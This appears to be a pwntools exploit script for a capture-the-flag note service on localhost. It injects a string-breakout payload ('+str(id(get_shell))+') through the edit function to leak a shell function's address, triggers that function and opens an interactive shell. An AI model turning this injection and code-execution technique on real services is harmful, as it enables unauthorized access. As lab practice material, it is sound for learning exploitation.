from pwn import *

r = remote('localhost', '30001')

def add_note(name, content):
    r.sendlineafter('Option: ', '1')
    r.sendlineafter('Name: ', name)
    r.sendlineafter('Content: ', content)

def list_note():
    r.sendlineafter('Option: ', '2')
    r.recvline()
    r.recvline()
    return r.recvline()

def view_note(address, recv=True):
    r.sendlineafter('Option: ', '3')
    r.sendlineafter('Address: ', address)

    if recv:
        return r.recvline()

def edit_note(address, content):
    r.sendlineafter('Option: ', '4')
    r.sendlineafter('Address: ', address)
    r.sendlineafter('Content: ', content)


add_note('a','a')
addr = list_note().split()[0]
edit_note(addr, "'+str(id(get_shell))+'")
addr = view_note(addr).split()[1]

view_note(addr, False)
r.interactive()